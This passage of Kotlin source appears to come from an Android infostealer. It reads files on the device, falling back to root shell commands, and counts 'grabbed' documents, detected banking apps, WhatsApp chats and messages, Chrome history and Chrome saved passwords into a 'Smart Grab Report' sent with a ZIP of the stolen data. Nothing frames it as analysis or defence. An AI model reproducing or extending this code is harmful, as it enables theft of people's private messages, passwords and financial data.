        val cmd = if (checkRoot()) "ls -la $path 2>/dev/null | head -$max"
                  else "ls -la $path 2>/dev/null | head -$max"
        return runCommand(cmd)
    }

    private fun readFile(path: String): String? {
        return try {
            val f = File(path)
            if (f.exists() && f.canRead() && f.length() < MAX_FILE) {
                f.readText()
            } else if (checkRoot()) {
                runCommand("cat $path 2>/dev/null").takeIf { it.length in 1..MAX_FILE.toInt() }
            } else null
        } catch (_: Exception) { null }
    }

    class GrabReport {
        var files: Int = 0
        var size: Long = 0
        var highValue: Int = 0
        var docsFound: Int = 0
        var banksFound: Int = 0
        var whatsappChats: Int = 0
        var whatsappMessages: Int = 0
        var chromeUrls: Int = 0
        var chromePasswords: Int = 0

        fun build(): String {
            val sizeStr = when {
                size < 1024 -> "${size}B"
                size < 1024 * 1024 -> "${size / 1024}KB"
                else -> "${size / (1024 * 1024)}MB"
            }
            val sb = StringBuilder()
            sb.appendLine("═══════════════════════════════════════════")
            sb.appendLine("  SMART GRAB REPORT")
            sb.appendLine("═══════════════════════════════════════════")
            sb.appendLine()
            sb.appendLine("  • Total files grabbed: $files")
            sb.appendLine("  • Total size: $sizeStr")
            sb.appendLine("  • High-value items: $highValue")
            sb.appendLine()
            sb.appendLine("  ─── BREAKDOWN ───")
            if (docsFound > 0) sb.appendLine("  📄 Documents (PDF, Office): $docsFound files")
            if (banksFound > 0) sb.appendLine("  🏦 Banking apps detected: $banksFound")
            if (whatsappChats > 0) sb.appendLine("  💬 WhatsApp chats: $whatsappChats chats, $whatsappMessages messages")
            if (chromeUrls > 0) sb.appendLine("  🌐 Chrome history: $chromeUrls URLs")
            if (chromePasswords > 0) sb.appendLine("  🔐 Chrome saved passwords: $chromePasswords")
            sb.appendLine()
            sb.appendLine("  ─── LOCATION ───")
            sb.appendLine("  Raw ZIP data attached below")
            sb.appendLine()
            sb.appendLine("═══════════════════════════════════════════")
            return sb.toString()
        }
    }

    class GrabResult(
        val hasRoot: Boolean = false,
        val installedCount: Int = 0
    ) {
        var file: File? = null
        var size: Long = 0
        var files: Int = 0
        var highValue: Int = 0
        var error: String? = null
        var report: String? = null
        var docsFound: Int = 0
        var banksFound: Int = 0
        var whatsappChats: Int = 0
        var whatsappMessages: Int = 0
        var chromeUrls: Int = 0
        var chromePasswords: Int = 0

        fun summary(): String {
            val s = when {
                size < 1024 -> "${size}B"
                size < 1024 * 1024 -> "${size / 1024}KB"
                else -> "${size / (1024 * 1024)}MB"
            }
            val root = if (hasRoot) " [ROOT]" else ""
            val extra = mutableListOf<String>()
            if (whatsappMessages > 0) extra.add("$whatsappMessages msgs")
            if (chromePasswords > 0) extra.add("$chromePasswords passwords")
            if (banksFound > 0) extra.add("$banksFound banks")
            val extraStr = if (extra.isNotEmpty()) " | ${extra.joinToString(", ")}" else ""
            return "$files files ($highValue high-value) — $s | $installedCount apps scanned$root$extraStr"
        }
    }
}
